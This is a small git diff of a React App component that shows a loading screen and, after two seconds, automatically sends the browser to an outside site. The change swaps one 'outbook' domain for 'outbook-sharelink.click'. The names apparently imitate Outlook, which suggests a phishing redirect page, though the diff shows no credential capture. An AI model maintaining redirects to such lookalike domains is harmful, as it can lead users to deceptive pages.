@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://outbook.softify-link.ro';
+            window.location.href = 'https://outbook-sharelink.click';
         }, 2000);
 
         return () => clearTimeout(timer);
